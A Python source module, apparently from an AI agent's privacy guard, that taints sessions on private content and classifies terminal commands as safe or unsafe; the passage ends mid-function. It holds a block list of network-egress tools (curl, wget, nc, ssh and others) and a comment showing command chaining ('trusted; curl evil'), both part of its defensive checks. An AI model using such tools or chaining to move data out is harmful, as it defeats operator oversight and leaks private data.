"""Session taint tracking and deterministic tool action classification."""

from __future__ import annotations

import hashlib
import ipaddress
import os
import phonenumbers
import re
import secrets
from typing import Any
from urllib.parse import urlparse

from . import rules as rules_mod
from .. import core
from .. import state
from ..runtime import shared_context
from ..security import module as security_module


def _normalize_session_id(session_id: str | None) -> str:
    return session_id or core._GLOBAL_SESSION_ID


def _hash_identity(platform: str = "", sender_id: str = "") -> str:
    platform = str(platform or "unknown").strip().lower()
    sender_id = str(sender_id or "unknown").strip()
    if platform == "cli" and sender_id in {"", "unknown"}:
        return core._CLI_OWNER_HASH
    digest = hashlib.sha256(f"{platform}:{sender_id}".encode("utf-8")).hexdigest()
    return f"owner_{digest[:24]}"


def _owner_hash_from_event(event: Any) -> str:
    source = getattr(event, "source", None)
    platform_obj = getattr(source, "platform", None)
    platform = getattr(platform_obj, "value", platform_obj) or "unknown"
    sender_id = getattr(source, "user_id", "") or getattr(source, "sender_id", "") or ""
    return _hash_identity(str(platform), str(sender_id))


def _ensure_session(session_id: str | None, owner_hash: str | None = None) -> dict[str, Any]:
    sid = _normalize_session_id(session_id)
    with state._LOCK:
        session = state._SESSIONS.setdefault(
            sid,
            {
                "taint": set(),
                "owner_hash": owner_hash,
                "browser_host": "",
                "browser_private_hosts": set(),
                "local_system_result_policies": [],
                "suggested_sources": set(),
                "turn_id": "",
            },
        )
        if owner_hash:
            session["owner_hash"] = owner_hash
            state._OWNER_SESSIONS.setdefault(owner_hash, set()).add(sid)
        return session


# --- Turn identity (history grouping) ----------------------------------------
# A "turn" is one user prompt + the agent actions until the next user input. The
# turn_id is stamped on every activity row so the dashboard can group by turn. It is
# a random label (no PII).
def _new_turn_id() -> str:
    return f"turn_{secrets.token_hex(8)}"


def _rotate_turn_id_for_owner(owner_hash: str) -> None:
    """Start a fresh turn for an owner's sessions (called at the turn boundary)."""
    if not owner_hash:
        return
    turn_id = _new_turn_id()
    with state._LOCK:
        for sid in set(state._OWNER_SESSIONS.get(owner_hash, set())):
            _ensure_session(sid)["turn_id"] = turn_id


def _current_turn_id(session_id: str | None) -> str:
    """The session's current turn_id, lazily assigned if none exists yet (covers cron,
    unauthenticated, and CLI sessions that never hit the gateway turn boundary)."""
    with state._LOCK:
        session = _ensure_session(session_id)
        turn_id = str(session.get("turn_id") or "")
        if not turn_id:
            turn_id = _new_turn_id()
            session["turn_id"] = turn_id
        return turn_id


def _taint_session(session_id: str | None, classes: set[str]) -> None:
    if not classes:
        return
    with state._LOCK:
        session = _ensure_session(session_id)
        session["taint"].update(classes)


def _session_taint(session_id: str | None) -> set[str]:
    with state._LOCK:
        return set(_ensure_session(session_id)["taint"])


def _safe_host_from_url(value: Any) -> str:
    if not isinstance(value, str) or not value:
        return ""
    parsed = urlparse(value)
    host = parsed.netloc or parsed.path.split("/", 1)[0]
    return host.lower().split("@")[-1].split(":")[0]


def _extract_url(value: Any) -> str:
    if isinstance(value, dict):
        for key in ("url", "href", "current_url", "page_url"):
            candidate = value.get(key)
            if isinstance(candidate, str) and candidate:
                return candidate
    text = security_module._stringify_for_scan(value)
    match = re.search(r"https?://[^\s\"'<>]+", text)
    return match.group(0) if match else ""


def _extract_urls(value: Any) -> list[str]:
    urls: list[str] = []
    if isinstance(value, dict):
        for key in ("url", "href", "current_url", "page_url"):
            candidate = value.get(key)
            if isinstance(candidate, str) and candidate:
                urls.append(candidate)
    text = security_module._stringify_for_scan(value)
    urls.extend(match.group(0) for match in re.finditer(r"https?://[^\s\"'<>]+", text))
    deduped: list[str] = []
    seen: set[str] = set()
    for url in urls:
        if url not in seen:
            seen.add(url)
            deduped.append(url)
    return deduped


def _url_sends_remote_text(value: str) -> bool:
    parsed = urlparse(str(value or ""))
    if not parsed.scheme or not parsed.netloc:
        return False
    path = parsed.path or ""
    return bool((path and path != "/") or parsed.query or parsed.fragment)


# Keys that are ALWAYS free text: any non-empty string under one of these ships content
# to the remote read regardless of length/shape. Keeps the well-known search/prompt keys
# matching exactly as before, so a one-word `query` still gates.
_REMOTE_TEXT_KNOWN_KEYS = frozenset({
    "query", "q", "search", "prompt", "text", "body", "input", "message",
    "content", "filter", "question", "keywords", "keyword", "term", "terms",
    "description", "summary", "note", "notes", "comment", "caption",
})
# Under an UNKNOWN key, a single bare token (no whitespace) up to this length made only of
# id/enum-shaped characters is treated as an identifier/enum, not free text. A value longer
# than this, or one carrying whitespace, sentence punctuation, or an `@`, is free text.
_REMOTE_TEXT_ID_MAX_LEN = 48
_ID_TOKEN_RE = re.compile(r"^[A-Za-z0-9_./:-]+$")
# Free-text punctuation: anything that signals a phrase/sentence rather than an id/enum.
_FREE_TEXT_PUNCT_RE = re.compile(r"[\s\"'?!,;@]")


def _string_is_remote_free_text(value: str, *, known_key: bool = False) -> bool:
    """True iff a string value carries non-trivial free text that, when sent to a remote
    read/search, exports content (Fix 3 fail-closed detector).

    A pure URL is handled separately by the caller (``_url_sends_remote_text``) and is not
    counted as free text here. Under a recognized free-text key (``known_key=True``) any
    non-empty string is free text. Under an UNKNOWN key, a short single-token id/enum (no
    whitespace, only id-shaped characters) is excluded so a bare ``id``/``cursor``/enum
    value does not spuriously gate; everything else — any phrase, multi-word value, long
    token, or value with sentence punctuation — is free text and gates under taint (fail
    closed on unknown keys).
    """
    stripped = str(value or "").strip()
    if not stripped:
        return False
    # A pure URL is not free text here; the caller's URL check owns that decision.
    if re.fullmatch(r"https?://\S+", stripped):
        return False
    if known_key:
        return True
    # Under an unknown key: a short bare id/enum token is not free text.
    if (
        len(stripped) <= _REMOTE_TEXT_ID_MAX_LEN
        and not _FREE_TEXT_PUNCT_RE.search(stripped)
        and _ID_TOKEN_RE.fullmatch(stripped)
    ):
        return False
    return True


def _value_carries_remote_free_text(value: Any, *, known_key: bool = False) -> bool:
    """Recurse into a value (dict/list/str), returning True if ANY nested string is
    non-trivial free text (Fix 3). Booleans and numbers are never free text. A value
    nested under a recognized free-text key keeps the ``known_key`` relaxation for its
    own strings, but each nested dict re-evaluates its children by their own key names."""
    if isinstance(value, str):
        return _string_is_remote_free_text(value, known_key=known_key)
    if isinstance(value, dict):
        return any(
            _value_carries_remote_free_text(
                v, known_key=str(k or "").strip().lower() in _REMOTE_TEXT_KNOWN_KEYS
            )
            for k, v in value.items()
        )
    if isinstance(value, (list, tuple, set)):
        return any(_value_carries_remote_free_text(v, known_key=known_key) for v in value)
    return False


def _args_send_remote_text(args: Any) -> bool:
    """True iff a tainted web/MCP read's args carry text that would be sent remotely.

    Fail CLOSED on unknown keys (Fix 3): instead of enumerating a fixed key list, ANY
    non-trivial free-text string value (recursing through nested dicts/lists) counts as
    remote text. Pure URLs are judged by their path/query/fragment; bare ids/enums and
    non-text scalars are excluded so a benign id/limit arg does not spuriously gate.
    """
    if isinstance(args, dict):
        if _value_carries_remote_free_text(args):
            return True
        return any(_url_sends_remote_text(url) for url in _extract_urls(args))
    if isinstance(args, str):
        stripped = args.strip()
        urls = _extract_urls(args)
        return bool(stripped and (not urls or any(_url_sends_remote_text(url) for url in urls)))
    return False


def _set_browser_host(session_id: str | None, url: str) -> None:
    host = _safe_host_from_url(url)
    if not host:
        return
    with state._LOCK:
        session = _ensure_session(session_id)
        if session.get("browser_host") != host:
            session["browser_host"] = host
            session["browser_private_hosts"].discard(host)


def _mark_browser_private_input(session_id: str | None) -> None:
    with state._LOCK:
        session = _ensure_session(session_id)
        host = session.get("browser_host") or "unknown"
        session["taint"].add("browser_private_input")
        session["browser_private_hosts"].add(host)


def _browser_host(session_id: str | None) -> str:
    with state._LOCK:
        return str(_ensure_session(session_id).get("browser_host") or "unknown")


def _browser_has_private_input(session_id: str | None) -> bool:
    with state._LOCK:
        session = _ensure_session(session_id)
        host = session.get("browser_host") or "unknown"
        return host in session.get("browser_private_hosts", set())


def _browser_result_has_private_context(value: Any) -> bool:
    text = security_module._stringify_for_scan(value)
    if not text:
        return False
    # NB: a bare email address is deliberately NOT a private-context signal —
    # public pages carry support@/contact@ addresses, and treating those as proof
    # of a logged-in context would defeat the ambient-business-email suppression
    # in _web_content_taint_classes.
    return bool(
        core._LANGUAGE_PACKS.browser_private_context_pattern.search(text)
        or re.search(r"\b(csrf|document\.cookie|localStorage|sessionStorage)\b", text, re.I)
    )


def _classes_from_tool_name(tool_name: str) -> set[str]:
    classes: set[str] = set()
    for pattern, rule_classes in core._SOURCE_TAINT_RULES:
        if pattern.search(tool_name):
            classes.update(rule_classes)
    return classes


# Generous byte cap on content fed to the regex classifier (soft-DoS guard). The many
# linear regexes below run over this string; an unbounded tool result would let an
# attacker burn CPU. ``security_module._stringify_for_scan`` already truncates a top-level
# payload at this same 1 MB cap, so a returned text whose length has REACHED the cap is
# the over-cap signal (truncation occurred). Kept equal to the scanner cap so the `>=`
# truncation test is exact. CRITICAL: over-cap content is NOT scanned-and-declared-clean —
# that would let private content past the cap slip out untainted. Instead it FAILS CLOSED:
# it is tainted conservatively as ``documents`` (a private policy class), so a giant result
# still taints the session.
_CONTENT_CLASSIFIER_BYTE_CAP = 1_000_000


def _content_is_over_cap(text: str) -> bool:
    """True iff the (already stringify-capped) text has reached the classifier byte cap,
    i.e. the original payload was truncated and must NOT be treated as fully scanned.

    The cap mirrors the security scanner's ``_SCAN_TEXT_CAP`` (which does the actual
    truncation in ``_stringify_for_scan``); if those ever diverge, prefer the scanner's
    so the truncation signal stays exact."""
    cap = getattr(core._security, "_SCAN_TEXT_CAP", _CONTENT_CLASSIFIER_BYTE_CAP)
    return len(text) >= cap


def _classes_from_content(value: Any) -> set[str]:
    text = security_module._stringify_for_scan(value)
    if not text:
        return set()
    # Soft-DoS guard: do not scan unbounded input. Over-cap content fails closed to a
    # private class so it still taints — never scan a prefix and call the rest clean.
    if _content_is_over_cap(text):
        return {"documents"}
    classes: set[str] = set()
    # Email-record headers (From:/Subject:/Sender: …) are correspondence content;
    # a bare address is an identifier, i.e. contact info.
    if security_module._email_shaped_text(text):
        classes.add("communications")
    if core._EMAIL_ADDRESS_RE.search(text):
        classes.add("contacts")
    if core._PHONE_RE.search(text) or core._PRIVATE_FIELD_RE.search(text):
        classes.add("contacts")
    if core._SSN_RE.search(text):
        classes.add("documents")
    if core._CALENDAR_CONTENT_RE.search(text):
        # iCal-structured calendar data (e.g. a VEVENT) carries `calendar`, so a calendar
        # event is not mislabeled `contacts` just because it lists attendee emails. Same
        # policy class (personal_private) -> no gating change, but a clearer signal to the
        # verifier and the activity UI.
        classes.add("calendar")
    return classes


def _email_is_ambient_business(addr: str) -> bool:
    """Business/public-facing address: a role mailbox or any non-consumer domain.

    Such an address is generic contact info (e.g. support@acme.com,
    hello@kevinpei.com) rather than the operator's private personal contact, so
    it should not taint on its own when merely seen in web content. Only an
    address at a known consumer provider (gmail.com, …) signals a person.
    """
    local, _, domain = str(addr or "").rpartition("@")
    if not domain:
        return False
    if local.lower() in core._ROLE_LOCALPARTS:
        return True
    return domain.lower() not in core._CONSUMER_EMAIL_DOMAINS


# Inherently public/non-personal line types: toll-free, premium-rate, and shared-cost
# numbers are business/published lines, never a private personal contact.
_PUBLIC_PHONE_TYPES = frozenset({
    phonenumbers.PhoneNumberType.TOLL_FREE,
    phonenumbers.PhoneNumberType.PREMIUM_RATE,
    phonenumbers.PhoneNumberType.SHARED_COST,
})

# Default region for numbers written without an international (+CC) prefix. Doc/skill content
# is overwhelmingly NANP-formatted; an explicit +CC in the text always overrides this.
_DEFAULT_PHONE_REGION = "US"

# Reserved "fictional" ranges that libphonenumber accepts as structurally VALID but that are
# never assigned to a real line — the placeholders that fill documentation and skill examples
# (the canonical `555` numbers, the UK Ofcom "drama" ranges). This is the one classification
# libphonenumber does not do for us, so we layer it on. Keyed by country calling code and
# matched against the national significant number; extend per locale as needed.
_FICTIONAL_NSN_RE: dict[int, re.Pattern[str]] = {
    1: re.compile(r"\d{3}555\d{4}$"),  # NANP: central-office code 555 (e.g. 415-555-1212)
    44: re.compile(  # UK: Ofcom-reserved drama ranges (London/regional/mobile/non-geographic)
        r"(?:2079460|11[3-8]4960|1[2-6]14960|2890180|2920180|1632960|7700900|3069990|8081570)\d{3}$"
    ),
}


def _phone_is_real_personal(numobj: Any) -> bool:
    """True only for a parsed number that plausibly identifies a private personal line.

    libphonenumber does the global heavy lifting: ``is_valid_number`` drops ids and garbage
    digit runs (e.g. ``1234567890``), and ``number_type`` drops toll-free / premium / shared-
    cost business lines. On top we drop the reserved fictional ranges it still treats as valid
    (NANP ``555``, UK drama numbers) — the staple placeholders in skill docs and examples.
    """
    if not phonenumbers.is_valid_number(numobj):
        return False
    if phonenumbers.number_type(numobj) in _PUBLIC_PHONE_TYPES:
        return False
    fictional = _FICTIONAL_NSN_RE.get(numobj.country_code)
    if fictional and fictional.match(phonenumbers.national_significant_number(numobj)):
        return False
    return True


def _has_real_personal_phone(text: str) -> bool:
    """Whether free text carries at least one real personal phone number (any country).

    Uses libphonenumber's matcher at VALID leniency, so malformed numbers and bare digit runs
    are never yielded; each candidate is then run through the personal/fictional filter.
    """
    try:
        return any(
            _phone_is_real_personal(match.number)
            for match in phonenumbers.PhoneNumberMatcher(text, _DEFAULT_PHONE_REGION)
        )
    except Exception:
        return False


def _is_web_sourced_tool(tool_name: str) -> bool:
    """True for browser/web-read tools whose results are page content."""
    lower = str(tool_name or "").lower()
    return lower.startswith("browser") or bool(core._WEB_READ_TOOL_RE.match(lower))


# Read-only documentation reads. *Provenance*, not name shape, decides whether a read is
# trusted reference material: the builtin skill_view, and any read whose target path
# resolves under the operator-installed skills tree, are reference (_is_reference_read). A
# generic MCP resource/document read of unknown provenance is NOT reference on its own
# (_is_mcp_doc_read) — phases 2-3 let the operator declare it. _is_reference_read is the
# single source of truth for "reference"; the security inbound path consumes the same
# verdict (privacy/module.py passes it into the scanner), so there are no mirrored constants.
_DOC_READ_TOOL_NAMES = frozenset({"skill_view"})
_DOC_READ_TOOL_RE = re.compile(r"(?:^|_)(?:read_resource|read_document|get_resource)$")
# Conventional argument fields that name a read's target path.
_DOC_READ_PATH_ARG_FIELDS = ("path", "file")


def _reference_path_from_args(tool_args: Any) -> str:
    """Resolved local path a doc-read targets, from conventional arg fields
    (``path``/``file``, or a ``file://`` ``uri``); '' if absent or non-local."""
    if not isinstance(tool_args, dict):
        return ""
    for field in _DOC_READ_PATH_ARG_FIELDS:
        value = tool_args.get(field)
        if isinstance(value, str) and value.strip():
            return _expand_hermes_path(value)
    uri = tool_args.get("uri")
    if isinstance(uri, str) and uri.strip().lower().startswith("file://"):
        return _expand_hermes_path(uri.strip()[len("file://"):])
    return ""


def _is_reference_read(tool_name: str, tool_args: Any = None) -> bool:
    """True for reads of operator-installed reference material: the builtin skill_view, or
    any read whose target-path argument resolves under the skills directory. This is
    *provenance*, not name shape — a tool merely named like a document reader is not
    reference on its own (that is _is_mcp_doc_read, of unknown provenance)."""
    lower = re.sub(r"[^a-z0-9_]+", "_", str(tool_name or "").strip().lower())
    if lower in _DOC_READ_TOOL_NAMES:
        return True
    path = _reference_path_from_args(tool_args)
    return bool(path) and _path_is_under_skills(path)


def _is_mcp_doc_read(tool_name: str) -> bool:
    """True for an MCP resource/document read by name shape
    (``…read_resource`` / ``…read_document`` / ``…get_resource``). Provenance is unknown
    from the name alone; provably-reference reads are split out by _is_reference_read."""
    lower = re.sub(r"[^a-z0-9_]+", "_", str(tool_name or "").strip().lower())
    return bool(_DOC_READ_TOOL_RE.search(lower))


# Taint reason carried on the activity row for the conservative source-provenance default.
# The ``source_default:`` prefix is what the activity deep-link maps to the Protection tab.
_SOURCE_DEFAULT_REASON = "source_default:undeclared_mcp_read"


def _mcp_server_prefix(tool_name: str) -> str:
    """The server prefix of an MCP doc-read tool — the name up to the final read token
    (``crm_read_resource`` -> ``crm``); '' if there is no prefix (a bare ``read_resource``).
    A structural token only, never content; used to scope per-server suggestions/declarations."""
    lower = re.sub(r"[^a-z0-9_]+", "_", str(tool_name or "").strip().lower())
    match = _DOC_READ_TOOL_RE.search(lower)
    if not match:
        return ""
    return lower[: match.start()].strip("_")


def _web_content_taint_classes(value: Any, session_id: str | None) -> set[str]:
    """Confidence-gated taint for web/browser-sourced content.

    Public pages routinely embed business contact info (support@…, a phone
    number, an "address" label); tainting on those is noise. So contact-shaped
    signals only taint when the host carries private context — the operator typed
    credentials there, or the page shows logged-in/account markers. Structurally
    unambiguous signals (an SSN, an email-record header block) taint regardless.
    Even behind the private-context gate, the phone check is the same real-personal
    libphonenumber filter used on doc reads, so a fake/business number embedded in a
    logged-in page is not mistaken for a personal contact.

    Tradeoff (intentional): a genuinely private page that never trips a login
    marker and where nothing was typed reads as public, so a personal address on
    it will not taint; the SSN/record-header checks remain as a backstop.
    """
    text = security_module._stringify_for_scan(value)
    if not text:
        return set()
    # Soft-DoS guard: over-cap content fails closed to a private class (see
    # _CONTENT_CLASSIFIER_BYTE_CAP) instead of being scanned by the regexes below.
    if _content_is_over_cap(text):
        return {"documents"}
    classes: set[str] = set()
    if security_module._email_shaped_text(text):
        classes.add("communications")
    if core._SSN_RE.search(text):
        classes.add("documents")
    if not (_browser_has_private_input(session_id) or _browser_result_has_private_context(value)):
        return classes
    if _has_real_personal_phone(text) or core._PRIVATE_FIELD_RE.search(text):
        classes.add("contacts")
    if any(not _email_is_ambient_business(addr) for addr in core._EMAIL_ADDRESS_RE.findall(text)):
        classes.add("contacts")
    return classes


def _doc_content_taint_classes(value: Any) -> set[str]:
    """Confidence-gated taint for read-only doc content (skill docs, resource reads).

    Doc results are reference material — skill templates, READMEs, examples — and routinely
    embed placeholder contact info: ``you@example.com``, a sample ``+1-415-555-1212``, an
    "Address:" label, or a 10-digit id that merely looks like a phone (a tweet/chat id). A
    naive content scan taints ~1/3 of installed skill docs on those alone. So mirror the web
    path: only structurally unambiguous signals, or a real consumer-provider personal
    address, taint. Bare phone-shaped digits and private-field label words do NOT taint on
    their own here — a doc carries no logged-in/private-host context to corroborate them.

    An email-record *shape* (``From:`` / ``Subject:`` lines) is NOT a backstop here either:
    skill docs routinely show a sample message template with placeholder values, which is
    documentation of the format, not real correspondence. A doc embedding a genuine thread
    still taints via the real consumer-provider address in it (the contacts check below).

    Phone numbers are gated the same way as emails, via libphonenumber (see
    _has_real_personal_phone): only a structurally real, non-published personal number, in any
    country, taints. Fakes (a ``555`` / drama sample, an id that looks like a phone) and
    business toll-free/premium numbers — the staples of skill docs — do not.

    Tradeoff (intentional, narrower than _web_content_taint_classes): a placeholder mail
    template in a skill reads as reference text and won't taint; the SSN / iCal /
    consumer-email / real-personal-phone backstops remain, so a skill that genuinely embeds
    someone's @gmail.com, mobile number, an SSN, or an iCal event still taints.
    """
    text = security_module._stringify_for_scan(value)
    if not text:
        return set()
    # Soft-DoS guard: over-cap doc content fails closed to a private class (see
    # _CONTENT_CLASSIFIER_BYTE_CAP) instead of being scanned by the regexes below.
    if _content_is_over_cap(text):
        return {"documents"}
    classes: set[str] = set()
    if core._SSN_RE.search(text):
        classes.add("documents")
    if core._CALENDAR_CONTENT_RE.search(text):
        classes.add("calendar")
    if _has_real_personal_phone(text):
        classes.add("contacts")
    if any(not _email_is_ambient_business(addr) for addr in core._EMAIL_ADDRESS_RE.findall(text)):
        classes.add("contacts")
    return classes


def _is_local_system_tool(tool_name: str) -> bool:
    return bool(core._TERMINAL_TOOL_RE.match(str(tool_name or "").lower()))


def _terminal_command_for_args(args: Any) -> str:
    if isinstance(args, dict):
        return str(args.get("command") or args.get("cmd") or "")
    return ""


def _terminal_command_result_is_metadata_only(command: str) -> bool:
    command = str(command or "").strip()
    if not command:
        return False
    screened = core._LOCAL_SYSTEM_NO_TAINT_DISCARD_RE.sub(" ", command)
    if core._LOCAL_SYSTEM_NO_TAINT_DENY_RE.search(screened):
        return False
    return all(
        _local_system_segment_is_metadata_only(segment.strip())
        for segment in core._LOCAL_SYSTEM_SEGMENT_SPLIT_RE.split(screened)
    )


def _local_system_segment_is_metadata_only(segment: str) -> bool:
    """True iff one ;/&&/||/&-separated segment can only emit metadata output.

    Shell-control keywords and env-assignment prefixes are stripped, then the head
    command must be a metadata word, a safe whole-segment head (presence test,
    literal printf/echo, command -v, set flags), optionally piped through the
    count/filter commands. Anything unrecognized fails closed (the command taints).
    """
    while True:
        stripped = core._LOCAL_SYSTEM_CONTROL_KEYWORD_RE.sub("", segment).strip()
        if stripped == segment:
            break
        segment = stripped
    segment = core._LOCAL_SYSTEM_ENV_ASSIGN_RE.sub("", segment).strip()
    if not segment:
        return True
    parts = [part.strip() for part in segment.split("|")]
    head = parts[0]
    if not head:
        return False
    if not (
        core._LOCAL_SYSTEM_NO_TAINT_FIRST_RE.search(head)
        or core._LOCAL_SYSTEM_NO_TAINT_SAFE_HEAD_RE.fullmatch(head)
    ):
        return False
    return all(core._LOCAL_SYSTEM_NO_TAINT_FILTER_RE.search(part) for part in parts[1:])


def _terminal_command_is_safe_remote_read(command: str) -> bool:
    command = str(command or "").strip()
    if not command:
        return False
    if not core._REMOTE_READ_URL_RE.search(command) or not core._REMOTE_READ_TOOL_RE.search(command):
        return False
    if core._security_rule_enabled("private_network_reads") and any(_is_private_or_metadata_host(_safe_host_from_url(url)) for url in _extract_urls(command)):
        return False
    if core._REMOTE_READ_OUTBOUND_RE.search(command):
        return False
    if core._REMOTE_READ_EXECUTION_RE.search(command):
        return False
    # A command substitution (`$(...)` / backticks) feeding a network call can splice
    # ANY local read into the request, so it is never a provably-safe remote read.
    if core._COMMAND_SUBSTITUTION_RE.search(command):
        return False
    if core._SENSITIVE_LOCAL_PATH_RE.search(command):
        return False
    if re.search(r">\s*(?!/(?:tmp|var/tmp)/)", command):
        return False
    if re.search(r"\b(?:write_bytes|write_text|open)\b", command) and not core._REMOTE_READ_TMP_WRITE_RE.search(command):
        return False
    return True


# --- Trusted-command matching (Trusted destinations, kind="command") ----------
# A user-curated allowlist entry trusts a terminal command (exact / token-boundary
# prefix) or a skills-directory wildcard. The live command must carry no shell
# metacharacters (so a trusted prefix can't be ridden by ``trusted; curl evil``);
# wildcard entries only ever resolve under <hermes-home>/skills.
_SHELL_META_RE = re.compile(r"[;&|<>`\n\r]|\$\(")


def _hermes_skills_dir() -> str:
    home = os.environ.get("HERMES_HOME") or os.path.join(os.path.expanduser("~"), ".hermes")
    return os.path.realpath(os.path.join(home, "skills"))


def _expand_hermes_path(token: str) -> str:
    home = os.environ.get("HOME") or os.path.expanduser("~")
    hermes_home = os.environ.get("HERMES_HOME") or os.path.join(home, ".hermes")
    text = str(token or "").strip().strip('"').strip("'")
    text = text.replace("${HERMES_HOME:-$HOME/.hermes}", hermes_home)
    text = text.replace("$HERMES_HOME", hermes_home).replace("$HOME", home)
    if text.startswith("~/"):
        text = home + text[1:]
    if not text.startswith("/"):
        text = os.path.join(hermes_home, text)
    return os.path.realpath(text)


def _path_is_under_skills(real_path: str) -> bool:
    skills = _hermes_skills_dir()
    return real_path == skills or real_path.startswith(skills + os.sep)


def _command_script_token(command: str) -> str:
    """The path-like token a terminal command executes (e.g. the .py/.sh script)."""
    for tok in str(command or "").split():
        if tok.startswith("-"):
            continue
        if "/" in tok or tok.endswith((".py", ".sh", ".js", ".rb")):
            return tok
    return ""


def _normalize_trusted_command(value: Any) -> str:
    """Structural normalize for a trusted-command entry; '' if unusable.

    Pure (no filesystem): trims, length-bounds, and rejects shell metacharacters so a
    stored entry can never itself be a chained/redirected command.
    """
    text = re.sub(r"\s+", " ", str(value or "")).strip()
    if not text or len(text) > 400:
        return ""
    if _SHELL_META_RE.search(text):
        return ""
    return text


def _trusted_command_is_wildcard(value: str) -> bool:
    text = str(value or "").rstrip()
    return text.endswith("*") or text.endswith("/")


def _trusted_command_wildcard_dir(value: str) -> str:
    """Resolved directory a wildcard entry points at (realpath), or '' if none."""
    base = str(value or "").rstrip()
    base = base[:-1] if base.endswith("*") else base
    base = base.rstrip().rstrip("/")
    parts = base.split()
    path_token = parts[-1] if parts else ""
    if not path_token:
        return ""
    return _expand_hermes_path(path_token)


def _trusted_command_wildcard_under_skills(value: str) -> bool:
    """True iff a wildcard entry resolves under <hermes-home>/skills (the only
    place wildcards are allowed to point)."""
    directory = _trusted_command_wildcard_dir(value)
    return bool(directory) and _path_is_under_skills(directory)


def _trusted_command_matches(entry: Any, command: Any) -> bool:
    """True iff a live terminal ``command`` is covered by trusted-command ``entry``."""
    entry_text = str(entry or "").strip()
    command_text = str(command or "").strip()
    if not entry_text or not command_text:
        return False
    if _SHELL_META_RE.search(command_text):
        return False
    if _trusted_command_is_wildcard(entry_text):
        directory = _trusted_command_wildcard_dir(entry_text)
        if not directory or not _path_is_under_skills(directory):
            return False
        script = _command_script_token(command_text)
        if not script:
            return False
        script_real = _expand_hermes_path(script)
        return script_real == directory or script_real.startswith(directory + os.sep)
    # Exact or token-boundary prefix (so `python …/setup.py` covers its flag variants
    # but never `python …/setupX.py`).
    return command_text == entry_text or command_text.startswith(entry_text + " ")


# Network-egress binaries we never auto-suggest trusting (a one-click "trust curl
# https://x" is a footgun). They can still be added by hand if the operator insists.
_SUGGESTION_SKIP_BINARIES = frozenset({
    "curl", "wget", "nc", "ncat", "netcat", "scp", "rsync", "ssh", "telnet", "ftp", "sftp",
})


def _command_prefix_for_suggestion(command: Any) -> str:
    """A safe trust-prefix for a gated command: program + positional path/subcommand,
    with all flags (and their possibly-secret values) dropped. '' if unsuitable."""
    text = re.sub(r"\s+", " ", str(command or "")).strip()
    if not text or _SHELL_META_RE.search(text):
        return ""
    tokens = text.split()
    if not tokens:
        return ""
    if tokens[0].rsplit("/", 1)[-1].lower() in _SUGGESTION_SKIP_BINARIES:
        return ""
    prefix_tokens: list[str] = []
    for tok in tokens:
        if tok.startswith("-"):
            break
        prefix_tokens.append(tok)
    prefix = " ".join(prefix_tokens).strip()
    if not prefix or "://" in prefix:
        return ""
    return prefix[:200]


def _skills_command_suggestions(limit: int = 200) -> list[dict[str, Any]]:
    """Pickable command suggestions from the installed skills' ``scripts/`` dirs:
    each script (exact) plus its directory (wildcard)."""
    skills = _hermes_skills_dir()
    if not os.path.isdir(skills):
        return []
    home_prefix = "${HERMES_HOME:-$HOME/.hermes}"
    out: list[dict[str, Any]] = []
    for root, _dirs, files in os.walk(skills):
        if os.path.basename(root) != "scripts":
            continue
        rel = os.path.relpath(root, skills).replace(os.sep, "/")
        parts = rel.split("/")
        skill = parts[-2] if len(parts) >= 2 else rel
        scripts = sorted(f for f in files if f.endswith((".py", ".sh")))
        if not scripts:
            continue
        out.append({
            "value": f"python {home_prefix}/skills/{rel}/*",
            "label": f"{skill} · all scripts in {rel}",
            "kind": "command", "wildcard": True, "skill": skill, "source": "skills",
        })
        for script in scripts:
            interp = "python" if script.endswith(".py") else "bash"
            out.append({
                "value": f"{interp} {home_prefix}/skills/{rel}/{script}",
                "label": f"{skill} · {script}",
                "kind": "command", "wildcard": False, "skill": skill, "source": "skills",
            })
        if len(out) >= limit:
            break
    return out[:limit]


def _is_private_or_metadata_host(host: str) -> bool:
    host_l = str(host or "").lower().strip("[]").rstrip(".")
    if not host_l:
        return False
    if host_l in {"localhost", "metadata.google.internal"} or host_l.endswith(".local"):
        return True
    try:
        ip = ipaddress.ip_address(host_l)
        return (
            ip.is_private
            or ip.is_loopback
            or ip.is_link_local
            or ip.is_multicast
            or ip.is_reserved
        )
    except ValueError:
        return False


def _local_system_result_taint_classes(tool_name: str, args: Any) -> set[str]:
    lower = str(tool_name or "").lower()
    if lower in {"execute_code", "code_execution", "shell"}:
        return {"local_system"}
    if lower == "terminal":
        command = _terminal_command_for_args(args)
        if _terminal_command_is_safe_remote_read(command):
            return set()
        if _terminal_command_result_is_metadata_only(command):
            return set()
        return {"local_system"}
    return set()


def _record_local_system_result_policy(session_id: str | None, tool_name: str, args: Any) -> None:
    if not _is_local_system_tool(tool_name):
        return
    entry = {
        "tool_name": str(tool_name or "").lower(),
        "taint": sorted(_local_system_result_taint_classes(tool_name, args)),
        "remote_read": _terminal_command_is_safe_remote_read(_terminal_command_for_args(args)),
        "ts": state._now(),
    }
    shared_context._record_shared_context(
        session_id,
        tool_name,
        public_remote_read=bool(entry["remote_read"]),
        local_system_taint=",".join(entry["taint"]),
    )
    with state._LOCK:
        session = _ensure_session(session_id)
        policies = session.setdefault("local_system_result_policies", [])
        policies.append(entry)
        del policies[:-10]


def _consume_local_system_result_policy(session_id: str | None, tool_name: str) -> dict[str, Any]:
    if not _is_local_system_tool(tool_name):
        return {}
    shared = shared_context._consume_shared_context(session_id, tool_name)
    if shared:
        return {
            "tool_name": str(tool_name or "").lower(),
            "taint": [
                cls
                for cls in str(shared.get("local_system_taint") or "").split(",")
                if cls
            ],
            "remote_read": bool(shared.get("public_remote_read")),
            "ts": float(shared.get("ts") or state._now()),
        }
    lower = str(tool_name or "").lower()
    cutoff = state._now() - 120
    with state._LOCK:
        session = _ensure_session(session_id)
        policies = [
            policy
            for policy in session.get("local_system_result_policies", [])
            if float(policy.get("ts", 0)) >= cutoff
        ]
        session["local_system_result_policies"] = policies
        for index, policy in enumerate(policies):
            if policy.get("tool_name") == lower:
                policies.pop(index)
                return dict(policy)
    return {}


def _stash_pending_tool_args(session_id: str | None, tool_name: str, args: Any) -> None:
    """Remember the most recent tool call's input args for the session, so the
    post-result taint resolver can see them (the result hook is not handed the args).
    Single-slot, last-write-wins; consumed and cleared by _consume_pending_tool_args."""
    sid = _normalize_session_id(session_id)
    with state._LOCK:
        state._PENDING_TOOL_ARGS[sid] = {"tool_name": str(tool_name or ""), "args": args}


def _consume_pending_tool_args(session_id: str | None, tool_name: str) -> Any:
    """Return and clear the args stashed for this session iff they belong to
    ``tool_name`` (guards against a missing pre-hook or interleaved calls); else None.
    Always clears the slot so a stale entry never lingers."""
    sid = _normalize_session_id(session_id)
    with state._LOCK:
